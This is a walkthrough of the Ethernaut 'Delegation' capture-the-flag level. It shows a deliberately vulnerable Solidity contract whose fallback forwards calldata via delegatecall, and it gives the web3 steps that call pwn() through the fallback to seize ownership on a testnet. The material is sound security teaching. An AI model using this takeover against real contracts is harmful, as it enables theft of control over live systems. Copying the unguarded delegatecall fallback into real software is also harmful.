---
title: "Delegation – Level 6 Walkthrough"
summary: "Step-by-step walkthrough for the Ethernaut Delegation level. Learn to exploit delegatecall misuse, claim ownership, and understand storage collision vulnerabilities in smart contracts."
date: "Jun 28 2025"
tags:
- Ethereum
- Smart Contracts
- Security
- Ethernaut
- Walkthrough
---

 Delegation – Level 6 Walkthrough

Welcome to the **Delegation** level of the [Ethernaut wargame](https://ethernaut.openzeppelin.com/) by OpenZeppelin, where you’ll exploit **`delegatecall` misuse** to take control of a contract.

---

 Challenge Objective

You are given a contract that delegates calls to another contract using `delegatecall`.

Your goals:

* **Become the owner** of the main contract
* Submit the instance to complete the level

---

 Prerequisites

Before starting, make sure you have:

* MetaMask installed and connected
* Test ETH on a testnet (e.g., Sepolia)
* Familiarity with `delegatecall` in Solidity
* Access to [Ethernaut](https://ethernaut.openzeppelin.com/) and browser DevTools console

---

 What’s the Vulnerability?

The key vulnerability lies in the misuse of `delegatecall`.

 Contract Summary:

There are two contracts:

 Delegate.sol

```solidity
contract Delegate {
 address public owner;

 constructor(address _owner) {
 owner = _owner;
 }

 function pwn() public {
 owner = msg.sender;
 }
}
```

 Delegation.sol

```solidity
contract Delegation {
 address public owner;
 Delegate delegate;

 constructor(address _delegateAddress) {
 delegate = Delegate(_delegateAddress);
 owner = msg.sender;
 }

 fallback() external {
 (bool result, ) = address(delegate).delegatecall(msg.data);
 if (result) {
 this;
 }
 }
}
```

 The `fallback` function uses `delegatecall`, which runs the **Delegate’s code** in the **Delegation’s context**, allowing you to manipulate the storage of Delegation.

By calling the function `pwn()` via the fallback, we can set ourselves as `owner`.

---

 Getting Started

 1. Load the Level

* Go to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
* Select **Delegation**
* Click **“Get new instance”** and approve in MetaMask

---

 Walkthrough – Step by Step

 Step 1: Find Function Signature for `pwn()`

Use web3 to get the function signature:

```js
web3.utils.keccak256("pwn()").slice(0,10)
```

> Output: `"0xdd365b8b"`

This is the **method selector** for `pwn()`.

---

 Step 2: Call Fallback With Function Selector

Now call the fallback function with the `pwn()` signature to invoke it through `delegatecall`:

```js
await web3.eth.sendTransaction({
 from: player,
 to: contract.address,
 data: "0xdd365b8b"
});
```

> This triggers the fallback function in `Delegation`, which calls `pwn()` from `Delegate` using `delegatecall`. Since storage is shared, `owner` in `Delegation` is now `msg.sender`, i.e., **you**.

---

 Step 3: Verify Ownership

```js
await contract.owner()
// should return your wallet address (player)
```

---

 Step 4: Submit the Level

Click **“Submit instance”** and confirm in MetaMask. If you’re the owner now, the level will be marked as complete.

---

 What You Learn

* How `delegatecall` works in Solidity
* The risks of blindly forwarding calldata with `delegatecall`
* How storage layout matters when delegating logic

---

 Concepts Covered

| Concept | Description |
| ----------------- | ------------------------------------------------------------------------------- |
| `delegatecall` | Executes code from another contract, but in the context of the calling contract |
| Fallback function | Catches calls to undefined functions; dangerous when paired with delegatecall |
| Function selector | First 4 bytes of the Keccak-256 hash of the function signature |
| Storage collision | Delegatecall modifies the storage of the calling contract, not the callee |

---

 Resources

* [Ethernaut Game](https://ethernaut.openzeppelin.com/)
* [Solidity Docs – delegatecall](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries)
* [Blog: How to Hack Solidity Contracts with delegatecall](https://blog.openzeppelin.com/solidity-101-how-to-hack-delegatecall/)

---

Ready for the next challenge, **Force**? Let me know!
